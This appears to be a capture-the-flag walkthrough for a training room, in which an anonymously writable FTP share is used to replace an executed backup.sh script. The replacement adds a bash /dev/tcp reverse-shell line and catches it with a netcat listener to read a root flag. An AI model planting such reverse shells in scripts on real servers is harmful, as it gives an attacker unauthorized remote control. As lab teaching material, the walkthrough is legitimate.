# [Day 9] Networking - Anyone can be Santa!

## Topics

- FTP

### 1. Name the directory on the FTP server that has data accessible by the "anonymous" user
```
public
```
Connect to the FTP server with the command: `ftp 10.10.x.x`. Once you're connected you can run `ls` to find the directory with the necessary permissions.

### 2. What script gets executed within this directory?
```
backup.sh
```
Change into the public folder. Inside you can run `ls` again to find the file.

### 3. What movie did Santa have on his Christmas shopping list?
```
The Polar Express
```
Download the file with `get shoppinglist.txt`. In another terminal you should see the downloaded file (Make sure you're on the same directory as the ftp connection). With the downloaded file in your computer, you can cat it out.

### 4. Re-upload this script to contain malicious data (just like we did in section 9.6. Output the contents of /root/flag.txt!

1. Download the `backup.sh` script with `get backup.sh`
2. In your computer, edit the downloaded file. Add the following line in order to get a reverse shell:
```bash
bash -i >& /dev/tcp/10.10.x.x/4444 0>&1
```
- Make sure the IP is your THM machine's IP
3. In another terminal, start a netcat listener `nc -lvnp 4444`
4. In the terminal with the ftp connection, upload the file with `put backup.sh`
5. Wait for the reverse shell.
6. Once you get it, you should find the file with the flag.